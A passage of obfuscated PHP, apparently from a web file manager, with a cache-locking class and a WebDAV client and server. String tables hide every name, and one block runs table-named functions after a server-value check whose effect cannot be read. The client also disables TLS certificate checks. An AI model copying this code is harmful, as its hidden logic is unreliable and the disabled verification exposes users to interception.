array($fÙáæÙ‘ÆÙ[1432] => 0, $fÙáæÙ‘ÆÙ[387] => $Eì½îÙ„º, $fÙáæÙ‘ÆÙ[436] => array($fÙáæÙ‘ÆÙ[931], 0), $fÙáæÙ‘ÆÙ[388] => $fÙáæÙ‘ÆÙ[2216] . $dáÔá“ğÔ); return $this->where($fĞ„ó‚¸ö)->delete(); } } goto f¸šÎÛ°Ì; cìÎÈæ®İä: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DÇ¼‘Ç³¿; DÇ¼‘Ç³¿: $dùÏ±ÌëÉÁ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (self::$handle) { return self::$handle; } $fÜÃÑŠ†Š = $GLOBALS[$dùÏ±ÌëÉÁ[6]][$dùÏ±ÌëÉÁ[337]]; goto fÏÚÑ«§ó; b£ïÌÛèã: if ($d²ØœñˆŸ == $dùÏ±ÌëÉÁ[17] && $D‰Åù“³¤ == $dùÏ±ÌëÉÁ[9]) { $d²ØœñˆŸ = $dùÏ±ÌëÉÁ[167]; } switch ($d²ØœñˆŸ) { case $dùÏ±ÌëÉÁ[758]: self::$handle = new CacheLockRedis(); break; case $dùÏ±ÌëÉÁ[759]: self::$handle = new CacheLockMemcached(); break; case $dùÏ±ÌëÉÁ[17]: self::$handle = new CacheLockDatabase(); break; case $dùÏ±ÌëÉÁ[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto d»œ‚‰èŸ³; fÏÚÑ«§ó: self::$timeout = $fÜÃÑŠ†Š[$dùÏ±ÌëÉÁ[768]] ? $fÜÃÑŠ†Š[$dùÏ±ÌëÉÁ[768]] : 10; $D‰Åù“³¤ = _get($GLOBALS[$dùÏ±ÌëÉÁ[6]], $dùÏ±ÌëÉÁ[769]); $d²ØœñˆŸ = $fÜÃÑŠ†Š[$dùÏ±ÌëÉÁ[755]] ? $fÜÃÑŠ†Š[$dùÏ±ÌëÉÁ[755]] : $dùÏ±ÌëÉÁ[167]; goto b£ïÌÛèã; d»œ‚‰èŸ³: } private static function key($cƒŠŸ¹Šáô) { return $_SERVER[´Ù×Íå‘ÄõÛ][770] . Cache::key($cƒŠŸ¹Šáô); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($BÛÚ‰¸¤Ü¯ = '') { self::$errorMsg = $BÛÚ‰¸¤Ü¯; } public static function lockGlobal($D÷¦ßøÓˆ, $Dµ¿âĞ­˜) { return self::lock($D÷¦ßøÓˆ, $Dµ¿âĞ­˜, !0); } public static function lock($EÇ«‘·øÅ, $FêÁ‰ÏÅ—í = false, $a’Ò™È¼Ü• = false) { goto dô¾ì¸£‰á; FŸ§ÃÌ¯Òº: if (!$a’Ò™È¼Ü•) { self::$lockItem[$f­ã¡–à] = !0; } return $bÒ„»«ÈÃç; goto AÉİ˜›”ö’; AƒÅË‹óæâ: $FêÁ‰ÏÅ—í = $FêÁ‰ÏÅ—í ? $FêÁ‰ÏÅ—í : self::$timeout; $bÒ„»«ÈÃç = $D°Ù‘®Óà->lock($f­ã¡–à, $FêÁ‰ÏÅ—í); if (!$bÒ„»«ÈÃç) { $BÊ«’éÅ‡ê = $bÊÜ½‰ÒŠ¸[771] . $FêÁ‰ÏÅ—í . $bÊÜ½‰ÒŠ¸[67] . self::$errorMsg . $bÊÜ½‰ÒŠ¸[67] . get_caller_msg(); $fáç‚­°ä = "\114\x6f\x63\x6b\40\x61\x63\164\151\157\156\72\40{$f­ã¡–à}\40\x74\151\x6d\145\157\x75\x74\54\x6f\166\145\x72\x20{$FêÁ‰ÏÅ—í}\40\x73"; $fáç‚­°ä = self::$errorMsg ? self::$errorMsg : $eÈáó¾ö¼; write_log($BÊ«’éÅ‡ê, $bÊÜ½‰ÒŠ¸[772]); show_json($fáç‚­°ä, !1); } goto FŸ§ÃÌ¯Òº; dô¾ì¸£‰á: $bÊÜ½‰ÒŠ¸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D°Ù‘®Óà = self::init(); $f­ã¡–à = self::key($EÇ«‘·øÅ); goto AƒÅË‹óæâ; AÉİ˜›”ö’: } public static function lockGet($CÍš¬ëĞ¸) { $aö‰Ì°­İ = self::key($CÍš¬ëĞ¸); if (self::$lockItem[$aö‰Ì°­İ]) { return self::$lockItem[$aö‰Ì°­İ]; } return self::init()->lockGet($aö‰Ì°­İ); } public static function unlock($F”ù¾‰´¥…) { $FÃ˜ìÕ§Ã– = self::key($F”ù¾‰´¥…); self::$lockItem[$FÃ˜ìÕ§Ã–] = null; return self::init()->unlock($FÃ˜ìÕ§Ã–); } public static function unlockRuntime() { $aØ…”É³…¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fİê¹Õ¤íé = self::init(); $b«Šò¸¦ğ¬ = !1; foreach (self::$lockItem as $B±†„ßƒ => $EàµÀ¤ä¥) { if (!$EàµÀ¤ä¥) { continue; } $fİê¹Õ¤íé->unlock($B±†„ßƒ); if (!$b«Šò¸¦ğ¬) { $b«Šò¸¦ğ¬ = !0; write_log($aØ…”É³…¼[773] . $B±†„ßƒ . $aØ…”É³…¼[67] . get_caller_msg(), $aØ…”É³…¼[772]); continue; } write_log($aØ…”É³…¼[773] . $B±†„ßƒ, $aØ…”É³…¼[772]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A©êŒŠ¸°‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¥Âà™îßæ = $GLOBALS[$A©êŒŠ¸°‚[6]][$A©êŒŠ¸°‚[337]]; self::$cachePath = $C¥Âà™îßæ[$A©êŒŠ¸°‚[167]][$A©êŒŠ¸°‚[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($f©íÎìó, $dˆÛ—„™í = 0) { goto cº‘îò…éç; cº‘îò…éç: $DìÇ„îŠ¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÀ¯òèÎ˜© = microtime(!0); $Fò¬¸Á±—ä = $aÀ¯òèÎ˜© + $dˆÛ—„™í + 0.0001; goto f‘°Ù‘£Í—; f‘°Ù‘£Í—: $FŸœø™ßô = rtrim(self::$cachePath, $DìÇ„îŠ¦[8]) . $DìÇ„îŠ¦[774] . md5($f©íÎìó) . $DìÇ„îŠ¦[775]; if (file_exists($FŸœø™ßô) && filemtime($FŸœø™ßô) && filemtime($FŸœø™ßô) < time() - 10) { @unlink($FŸœø™ßô); } do { if (file_exists($FŸœø™ßô)) { cacheLockWait(); continue; } $e»‘ˆ’õà = fopen($FŸœø™ßô, $DìÇ„îŠ¦[776]); if (!$e»‘ˆ’õà) { return !1; } $fŠğÎù²±ò = flock($e»‘ˆ’õà, LOCK_EX | LOCK_NB); self::$caches[$f©íÎìó] = array($DìÇ„îŠ¦[777] => $e»‘ˆ’õà, $DìÇ„îŠ¦[167] => $FŸœø™ßô); fwrite($e»‘ˆ’õà, $Fò¬¸Á±—ä); clearstatcache(); if ($e»‘ˆ’õà && $fŠğÎù²±ò) { return !0; } cacheLockWait(); } while (microtime(!0) < $Fò¬¸Á±—ä); goto Cæ‘†œÁ“é; Cæ‘†œÁ“é: $this->unlock($f©íÎìó); return !1; goto fï…æ‰¼¦; fï…æ‰¼¦: } public function lockGet($C¿×¿‘’Æ) { $fÎà‘Ö°ï³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÎäæöÙ×Û = rtrim(self::$cachePath, $fÎà‘Ö°ï³[8]) . $fÎà‘Ö°ï³[774] . md5($C¿×¿‘’Æ) . $fÎà‘Ö°ï³[775]; return file_exists($dÎäæöÙ×Û); } public function unlock($CÜˆ…‘’ñ¸) { goto bÑë•šº¾™; bÑë•šº¾™: $B¼”¬ëë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f„ß„”­ƒÔ = self::$caches[$CÜˆ…‘’ñ¸]; if (!$f„ß„”­ƒÔ) { return; } goto CƒŠÄàÙ±Ù; b÷ˆ¤œ¸Ï: unset(self::$caches[$CÜˆ…‘’ñ¸]); goto fŠ÷½¥Æğ; CƒŠÄàÙ±Ù: @flock($f„ß„”­ƒÔ[$B¼”¬ëë[777]], LOCK_UN); @fclose($f„ß„”­ƒÔ[$B¼”¬ëë[777]]); @unlink($f„ß„”­ƒÔ[$B¼”¬ëë[167]]); goto b÷ˆ¤œ¸Ï; fŠ÷½¥Æğ: } } goto CÁ‚¥Œ„İø; BŞƒè±Œ: if ($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][791]] != $D¦‚æ¡ŸÓ($báõ™ ÷öÏ)) { goto CÇáêŞ»“¤; CÇáêŞ»“¤: $c‘İ§ê·ßÖ = $_SERVER[´Ù×Íå‘ÄõÛ][793]; $CÕ×‹‚•Ã = $_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][794]] . $_SERVER[´Ù×Íå‘ÄõÛ][795]; $A”„´íÙÜÓ = $c‘İ§ê·ßÖ($CÕ×‹‚•Ã); goto B°ñçéŞ¸÷; B°ñçéŞ¸÷: $B„œÄ®£Ÿé = explode($_SERVER[´Ù×Íå‘ÄõÛ][217], $A”„´íÙÜÓ); if (count($B„œÄ®£Ÿé) < $_SERVER[´Ù×Íå‘ÄõÛ][558]) { $aœß¥³£áó = $_SERVER[´Ù×Íå‘ÄõÛ][796]; $aœß¥³£áó(); } $dËÁËéâÇ = $_SERVER[´Ù×Íå‘ÄõÛ][1246]; goto E®àÁãåö; E®àÁãåö: $dËÁËéâÇ($báõ™ ÷öÏ); goto fŒ˜Ò…¤Ù; fŒ˜Ò…¤Ù: } class HttpDavClient { public function __construct($E­Ş¼Íó¨ù, $F‹Æ£ÔÔ“, $EãÆ»§ğÊ¬) { $this->header = array(); $this->userName = $F‹Æ£ÔÔ“; $this->userPassowrd = $EãÆ»§ğÊ¬; } protected function makePath($a“‘«éâÙö) { return $a“‘«éâÙö; } protected function setHeader($e¤ò¯éğ±, $f„÷­¬ã¿ = false) { if ($f„÷­¬ã¿ === !1) { $this->header[] = $e¤ò¯éğ±; } else { $this->header[] = $e¤ò¯éğ± . $_SERVER[´Ù×Íå‘ÄõÛ][883] . $f„÷­¬ã¿; } } public function move($EÁÇî”£¿, $cÚ…Šìğì², $CŠï¯²µ…‘ = '') { $cùßÖ´¤·ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->setHeader($cùßÖ´¤·ë[1774], $this->makePath($cÚ…Šìğì²)); $this->setHeader($cùßÖ´¤·ë[1775], $cùßÖ´¤·ë[1776]); if ($CŠï¯²µ…‘) { $this->setHeader($cùßÖ´¤·ë[1777], $cùßÖ´¤·ë[928] . $CŠï¯²µ…‘ . $cùßÖ´¤·ë[931]); } return $this->send($cùßÖ´¤·ë[1778], $EÁÇî”£¿); } public function copy($EºŒ‘Œµğ›, $BÀí¾Æ¨œÁ) { $EĞÉŞŸº“ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->setHeader($EĞÉŞŸº“ê[1774], $this->makePath($BÀí¾Æ¨œÁ)); $this->setHeader($EĞÉŞŸº“ê[1775], $EĞÉŞŸº“ê[1776]); return $this->send($EĞÉŞŸº“ê[1779], $EºŒ‘Œµğ›); } public function mkcol($A„½äÏ«é) { $f­í¥°¥İÏ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->setHeader($f­í¥°¥İÏ[1775], $f­í¥°¥İÏ[1776]); return $this->send($f­í¥°¥İÏ[1780], $A„½äÏ«é); } public function delete($bÄ³…­Í, $dÔî«ë›·… = '') { $AÄÌ··Á³À =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($dÔî«ë›·…) { $this->setHeader($AÄÌ··Á³À[1777], $AÄÌ··Á³À[928] . $dÔî«ë›·… . $AÄÌ··Á³À[931]); } return $this->send($AÄÌ··Á³À[1257], $bÄ³…­Í); } public function propfind($f¹†ìğ‘±) { $DËÜ¾àÌ›ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->setHeader($DËÜ¾àÌ›ë[1781], $DËÜ¾àÌ›ë[83]); $this->setHeader($DËÜ¾àÌ›ë[1782], $DËÜ¾àÌ›ë[1783]); $BÚŒ´È÷Ä¤ = $DËÜ¾àÌ›ë[1784]; return $this->send($DËÜ¾àÌ›ë[1785], $f¹†ìğ‘±, $BÚŒ´È÷Ä¤); } public function options($EˆÜ¨ëî¬) { return $this->send($_SERVER[´Ù×Íå‘ÄõÛ][1786], $EˆÜ¨ëî¬); } public function get($D‡îĞŸë) { return $this->send($_SERVER[´Ù×Íå‘ÄõÛ][216], $D‡îĞŸë); } public function put($añè…ˆíâ¿, $Cº™ºÁ‹ù—, $EæºÜ¿”ÔÙ = '') { $dî©œÙÉ²š =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($EæºÜ¿”ÔÙ) { $this->setHeader($dî©œÙÉ²š[1777], $dî©œÙÉ²š[928] . $EæºÜ¿”ÔÙ . $dî©œÙÉ²š[931]); } return $this->send($dî©œÙÉ²š[214], $añè…ˆíâ¿, $Cº™ºÁ‹ù—); } protected function send($DğÌùêˆµÏ, $f’øÂØ¸ä, $b³ñª†çˆÃ = false, $bõ»´ÚÑŒ™ = false) { goto B‰“¾™ÉË; Fôì©ˆóòã: $a­Óªßß» = curl_init($f’øÂØ¸ä); curl_setopt($a­Óªßß», CURLOPT_CUSTOMREQUEST, $DğÌùêˆµÏ); curl_setopt($a­Óªßß», CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto c¥ËŠ¸”; Bª«ºÊğÆ­: $this->header = array(); return $A¦Ş¼†ö‚; goto b”èâ–ŸÁŒ; aïƒ¶àî: $this->setHeader($BóØèßãÔÂ); if ($b³ñª†çˆÃ) { $b³ñª†çˆÃ = $AİÕùÎÜŒˆ[1788] . $b³ñª†çˆÃ; } if (!request_url_safe($f’øÂØ¸ä)) { return !1; } goto Fôì©ˆóòã; f¿Ç²ƒ‹›Ÿ: curl_setopt($a­Óªßß», CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($a­Óªßß», CURLOPT_SSL_VERIFYHOST, !1); $A¦Ş¼†ö‚ = curl_exec($a­Óªßß»); goto Bª«ºÊğÆ­; c¥ËŠ¸”: curl_setopt($a­Óªßß», CURLOPT_HTTPHEADER, $this->header); curl_setopt($a­Óªßß», CURLOPT_RETURNTRANSFER, !0); curl_setopt($a­Óªßß», CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto f¿Ç²ƒ‹›Ÿ; B‰“¾™ÉË: $AİÕùÎÜŒˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BóØèßãÔÂ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($AİÕùÎÜŒˆ[1787], $AİÕùÎÜŒˆ[50]); goto aïƒ¶àî; b”èâ–ŸÁŒ: } } class HttpDavServer { public function __construct($e¨çšÕÄîÊ, $D‚‡ƒ ´´™) { $this->root = $e¨çšÕÄîÊ; $this->initPath($D‚‡ƒ ´´™); $this->start(); } public function initPath($dÚ‰•÷ƒ¦ä) { $CŸÒÈ…ê’í =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÉÁ²¯‹×² = rtrim($_SERVER[$CŸÒÈ…ê’í[1392]], $CŸÒÈ…ê’í[8]) . $CŸÒÈ…ê’í[8]; $this->urlBase = substr($CÉÁ²¯‹×², 0, strpos($CÉÁ²¯‹×², $dÚ‰•÷ƒ¦ä) + 1); $this->urlBase = rtrim($this->urlBase, $CŸÒÈ…ê’í[8]) . $dÚ‰•÷ƒ¦ä; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $b«é¡Ú‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bß‘ÂÄ„ = HttpAuth::get(); if ($bß‘ÂÄ„[$b«é¡Ú‹[537]] == $b«é¡Ú‹[1789] && $bß‘ÂÄ„[$b«é¡Ú‹[900]] == $b«é¡Ú‹[1790]) { return !0; } HttpAuth::error(); } public function start() { goto eß¥£ä©›; F¬ËĞ·ñ¶ä: if (!$DÒµÇîÑòÔ) { return; } self::response($DÒµÇîÑòÔ); goto b£‰ëƒ¤ÍÔ; dá—†Õª·ô: if (!method_exists($this, $A¾ÈµÙî)) { pr($A¾ÈµÙî . $Dã’Ü³Â‡Š[1791]); die; } $Bô‘Š‹Í± = array($Dã’Ü³Â‡Š[1792], $Dã’Ü³Â‡Š[1793]); if (!in_array($A¾ÈµÙî, $Bô‘Š‹Í±) && !$this->pathExists($this->path)) { $DÒµÇîÑòÔ = array($Dã’Ü³Â‡Š[1036] => 404); } else { $DÒµÇîÑòÔ = $this->{$A¾ÈµÙî}(); } goto F¬ËĞ·ñ¶ä; eß¥£ä©›: $Dã’Ü³Â‡Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->checkUser(); $A¾ÈµÙî = $Dã’Ü³Â‡Š[144] . HttpHeader::method(); goto dá—†Õª·ô; b£‰ëƒ¤ÍÔ: } public function pathGet($f å ­ïóˆ = false) { $d¿¹Ï¶†ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Eé§ö‡İ®Å = $f å ­ïóˆ ? $_SERVER[$d¿¹Ï¶†ƒ[1794]] : $_SERVER[$d¿¹Ï¶†ƒ[1392]]; $Eé§ö‡İ®Å = KodIO::clear(rawurldecode($Eé§ö‡İ®Å)); if (!strstr($Eé§ö‡İ®Å, KodIO::clear($this->urlBase))) { return !1; } return substr($Eé§ö‡İ®Å, strpos($Eé§ö‡İ®Å, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($B…øÚç†Õ÷) { return file_exists($B…øÚç†Õ÷); } public function pathMkdir($aÂ­±á½) { return mkdir($aÂ­±á½, 511, !0); } public function pathInfo($a”À¡êÒÑ) { return path_info($a”À¡êÒÑ); } public function pathList($FèáÒ‰Šƒ¥) { return path_list($FèáÒ‰Šƒ¥); } public function pathOut($AÜÉùø¹ßù) { echo file_get_contents($AÜÉùø¹ßù); } public function pathPut($cŸèÁ–»ê‹, $b½ğçµ¬ø = '') { if (!$b½ğçµ¬ø) { return file_put_contents($cŸèÁ–»ê‹, $_SERVER[´Ù×Íå‘ÄõÛ][33]); } return move_path($b½ğçµ¬ø, $cŸèÁ–»ê‹); } public function pathRemove($aâĞª†åŸÍ) { if (is_file($aâĞª†åŸÍ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($E†¾‡›ÔÁ¬, $E²‹Æ©•Ö) { return move_path($E†¾‡›ÔÁ¬, $E²‹Æ©•Ö); } public function pathCopy($dâ°Ó”Ç‡Ù, $BÇ„’¹Ú) { return copy_dir($dâ°Ó”Ç‡Ù, $BÇ„’¹Ú); } public function parsePath($EóÈ§Ïˆ”) { return $EóÈ§Ïˆ”; } public function parseItem($AñË³‰ÆôÂ, $C³îÆİ’‚˜) { goto Bìõ¤Ê½Ï§; Bìõ¤Ê½Ï§: $aÓÂŠƒôÎõ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c…Û‘ŸÒêï = $this->pathGet() . $aÓÂŠƒôÎõ[8] . $AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[28]]; $c…Û‘ŸÒêï = $aÓÂŠƒôÎõ[8] . str_replace($aÓÂŠƒôÎõ[172], $aÓÂŠƒôÎõ[8], rawurlencode($c…Û‘ŸÒêï)); goto EªË¸Œ¾‘®; dÌŸµ°ô ‰: $FõÍÌ—©‘ = array($aÓÂŠƒôÎõ[1795] => KodIO::clear($this->urlBase . $c…Û‘ŸÒêï), $aÓÂŠƒôÎõ[107] => @gmdate($aÓÂŠƒôÎõ[1796], $AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[107]]), $aÓÂŠƒôÎõ[187] => @gmdate($aÓÂŠƒôÎõ[1797], $AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[187]]), $aÓÂŠƒôÎõ[77] => $AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[77]] ? $AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[77]] : 0); return $FõÍÌ—©‘; goto BˆíóÜ´‚; EªË¸Œ¾‘®: if ($C³îÆİ’‚˜) { $c…Û‘ŸÒêï = $aÓÂŠƒôÎõ[8] . str_replace($aÓÂŠƒôÎõ[172], $aÓÂŠƒôÎõ[8], rawurlencode($this->pathGet())); } if (!trim($AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[107]])) { $AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[107]] = time(); } if (!trim($AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[187]])) { $AñË³‰ÆôÂ[$aÓÂŠƒôÎõ[187]] = time(); } goto dÌŸµ°ô ‰; BˆíóÜ´‚: } public function parseItemXml($C›à„Ï˜Ó, $D¦ˆæ’‚ç²) { $bÈƒìĞÊ‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bŸ˜íîÇÕ³ = $this->parseItem($C›à„Ï˜Ó, $D¦ˆæ’‚ç²); if ($C›à„Ï˜Ó[$bÈƒìĞÊ‹[29]] == $bÈƒìĞÊ‹[76]) { $cÎ•ùÏ­æ = $bÈƒìĞÊ‹[1798]; $cÎ•ùÏ­æ .= $bÈƒìĞÊ‹[1799]; } else { $c«—”µöÕ = $C›à„Ï˜Ó[$bÈƒìĞÊ‹[160]] ? $C›à„Ï˜Ó[$bÈƒìĞÊ‹[160]] : get_path_ext($C›à„Ï˜Ó[$bÈƒìĞÊ‹[28]]); $EŠÇ“‚ £ = get_file_mime($c«—”µöÕ); $cÎ•ùÏ­æ = $bÈƒìĞÊ‹[1800]; $cÎ•ùÏ­æ .= "\x3c\x44\x3a\x67\145\x74\x63\157\x6e\x74\145\x6e\x74\x74\x79\160\x65\76{$EŠÇ“‚ £}\x3c\x2f\x44\x3a\x67\x65\164\143\157\x6e\164\145\x6e\164\164\171\x70\145\76"; } return "\12\x9\x9\74\x44\72\162\145\x73\160\x6f\x6e\163\x65\x3e\xa\x9\11\x9\74\104\x3a\150\x72\x65\x66\x3e{$bŸ˜íîÇÕ³[$bÈƒìĞÊ‹[1795]]}\x3c\x2f\x44\72\150\162\x65\146\x3e\12\x9\x9\x9\x3c\x44\x3a\160\162\x6f\x70\x73\x74\x61\164\x3e\12\x9\x9\x9\11\x3c\104\x3a\x70\162\157\160\x3e\xa\x9\11\x9\x9\x9\74\x44\x3a\147\x65\x74\154\141\x73\x74\x6d\157\x64\151\146\x69\145\x64\76{$bŸ˜íîÇÕ³[$bÈƒìĞÊ‹[107]]}\x3c\57\104\x3a\147\145\x74\154\141\x73\164\155\157\144\151\146\151\x65\144\x3e\xa\11\x9\x9\x9\x9\74\x44\x3a\143\162\x65\x61\x74\151\x6f\x6e\x64\x61\x74\145\76{$bŸ˜íîÇÕ³[$bÈƒìĞÊ‹[187]]}\74\x2f\104\72\143\162\145\141\164\151\157\x6e\x64\141\164\x65\x3e\12\x9\11\x9\x9\11\74\104\72\x67\145\x74\x63\x6f\x6e\x74\x65\x6e\164\x6c\x65\156\147\164\150\76{$bŸ˜íîÇÕ³[$bÈƒìĞÊ‹[77]]}\74\x2f\x44\x3a\147\145\x74\x63\157\x6e\164\x65\156\164\154\145\156\x67\164\150\76\xa\11\11\x9\11\x9{$cÎ•ùÏ­æ}\xa\11\11\x9\x9\74\57\104\x3a\x70\162\x6f\160\76\12\11\x9\x9\x9\x3c\104\x3a\x73\164\x61\164\x75\x73\x3e\x48\x54\x54\x50\57\x31\x2e\61\x20\62\x30\x30\40\117\x4b\x3c\x2f\104\72\x73\x74\141\x74\165\163\76\12\11\x9\11\74\x2f\x44\x3a\160\x72\157\160\x73\164\x61\x74\x3e\xa\x9\11\x3c\x2f\104\x3a\x72\x65\x73\160\x6f\156\x73\x65\x3e"; } public function pathListMerge($Bœñ—‡Ä¥Û) { goto B÷Ñ¹Ì—ÔÙ; B÷Ñ¹Ì—ÔÙ: $cœÆ•ˆÛ¦÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$Bœñ—‡Ä¥Û) { return $Bœñ—‡Ä¥Û; } $eŒîÛ­Ÿí = array($cœÆ•ˆÛ¦÷[73], $cœÆ•ˆÛ¦÷[74], $cœÆ•ˆÛ¦÷[1801]); goto cØ…§ÔÃÕ„; B¾¦•‰„îÓ: return $dİì•‹Ÿˆ›; goto aŒ…¶ò÷³; cØ…§ÔÃÕ„: $dİì•‹Ÿˆ› = array(); foreach ($Bœñ—‡Ä¥Û as $Aâ£õâÎç => $fŸ¡Ó–’–ˆ) { if (!in_array($Aâ£õâÎç, $eŒîÛ­Ÿí) || !is_array($fŸ¡Ó–’–ˆ)) { continue; } $dİì•‹Ÿˆ› = array_merge($dİì•‹Ÿˆ›, $fŸ¡Ó–’–ˆ); } foreach ($dİì•‹Ÿˆ› as &$bù·çîÃøŠ) { $bù·çîÃøŠ[$cœÆ•ˆÛ¦÷[28]] = str_replace($cœÆ•ˆÛ¦÷[8], $cœÆ•ˆÛ¦÷[1394], $bù·çîÃøŠ[$cœÆ•ˆÛ¦÷[28]]); } goto B¾¦•‰„îÓ; aŒ…¶ò÷³: } public function httpPROPFIND() { goto CÏÄ…ğÃ÷’; A­­É¹’ : $F‹“ĞˆÔ® = $cˆˆ›Æ¡—¤[$aæª¿ÀˆÉ†[1802]]; if (!is_array($D’±ê˜ĞÁ) || $F‹“ĞˆÔ®[$aæª¿ÀˆÉ†[1803]] === !1) { return array($aæª¿ÀˆÉ†[1804] => 404, $aæª¿ÀˆÉ†[1805] => $aæª¿ÀˆÉ†[1806]); } $fˆŸËÅ¸ = $F‹“ĞˆÔ®[$aæª¿ÀˆÉ†[29]] == $aæª¿ÀˆÉ†[167] || HttpHeader::get($aæª¿ÀˆÉ†[1781]) == $aæª¿ÀˆÉ†[470]; goto bîÍÇÅ™ ; CÏÄ…ğÃ÷’: $aæª¿ÀˆÉ† =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cˆˆ›Æ¡—¤ = $this->pathList($this->path); $D’±ê˜ĞÁ = $this->pathListMerge($cˆˆ›Æ¡—¤); goto A­­É¹’ ; a‰§•‰ˆÌâ: return array($aæª¿ÀˆÉ†[1804] => 207, $aæª¿ÀˆÉ†[1805] => "\x3c\x44\x3a\x6d\x75\154\x74\x69\163\x74\x61\x74\x75\163\x20\170\155\x6c\156\x73\x3a\104\75\42\x44\101\x56\72\42\76\xa{$E ¼˜°‘àá}\12\74\x2f\x44\x3a\x6d\165\154\164\x69\x73\164\x61\x74\x75\x73\76"); goto Bè«¥ ¼Ú°; bîÍÇÅ™ : if ($fˆŸËÅ¸) { $D’±ê˜ĞÁ = array($F‹“ĞˆÔ®); } else { $F‹“ĞˆÔ®[$aæª¿ÀˆÉ†[28]] = $aæª¿ÀˆÉ†[33]; $D’±ê˜ĞÁ = array_merge(array($F‹“ĞˆÔ®), $D’±ê˜ĞÁ); } $E ¼˜°‘àá = $aæª¿ÀˆÉ†[33]; foreach ($D’±ê˜ĞÁ as $BİøõÚ¢Ş) { $E ¼˜°‘àá .= $this->parseItemXml($BİøõÚ¢Ş, $fˆŸËÅ¸); } goto a‰§•‰ˆÌâ; Bè«¥ ¼Ú°: } public function httpHEAD() { $DçÅĞ‚°îó =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C†‹‰àÅÕ = $this->pathInfo($this->path); if (!$C†‹‰àÅÕ || $C†‹‰àÅÕ[$DçÅĞ‚°îó[29]] == $DçÅĞ‚°îó[76]) { return array($DçÅĞ‚°îó[1036] => 200, $DçÅĞ‚°îó[1211] => array($DçÅĞ‚°îó[1807])); } return array($DçÅĞ‚°îó[1036] => 200, $DçÅĞ‚°îó[1211] => array($DçÅĞ‚°îó[1808], $DçÅĞ‚°îó[136], $DçÅĞ‚°îó[1809] . $C†‹‰àÅÕ[$DçÅĞ‚°îó[77]], $DçÅĞ‚°îó[1810] . get_file_mime($C†‹‰àÅÕ[$DçÅĞ‚°îó[160]]), $DçÅĞ‚°îó[132] . gmdate($DçÅĞ‚°îó[1796], $C†‹‰àÅÕ[$DçÅĞ‚°îó[1260]]) . $DçÅĞ‚°îó[1811], $DçÅĞ‚°îó[1812])); } public function httpOPTIONS() { $aŸ»ÔĞœùå =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($aŸ»ÔĞœùå[1036] => 200, $aŸ»ÔĞœùå[1211] => array($aŸ»ÔĞœùå[1813], $aŸ»ÔĞœùå[1814], $aŸ»ÔĞœùå[1815], $aŸ»ÔĞœùå[1269])); } public function httpPROPPATCH() { $b¬¨ÙˆÒâ‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÈ…³Ç·· = $b¬¨ÙˆÒâ‹[1816] . $_SERVER[$b¬¨ÙˆÒâ‹[1392]] . $b¬¨ÙˆÒâ‹[1817]; return array($b¬¨ÙˆÒâ‹[1804] => 207, $b¬¨ÙˆÒâ‹[1805] => "\74\x44\x3a\x6d\x75\x6c\164\x69\x73\164\x61\164\165\163\x20\170\155\154\x6e\163\72\104\x3d\42\104\x41\126\x3a\x22\76\xa{$dÈ…³Ç··}\12\x3c\x2f\104\72\x6d\165\x6c\x74\151\x73\164\x61\164\165\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $BÇ•êø£ãé =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c·ø•›…˜å = $this->uploadFile(); if ($c·ø•›…˜å) { $D‚ËˆÜÃ¹¯ = 204; } else { $c·ø•›…˜å = $BÇ•êø£ãé[33]; $D‚ËˆÜÃ¹¯ = 201; } $E¤†ˆ•Ïœ = $this->pathPut($this->path, $c·ø•›…˜å); if ($E¤†ˆ•Ïœ == !1) { $D‚ËˆÜÃ¹¯ = 404; } return array($BÇ•êø£ãé[1804] => $D‚ËˆÜÃ¹¯); } private function uploadFile() { goto Fñ¯ôÄ×ÎÅ; 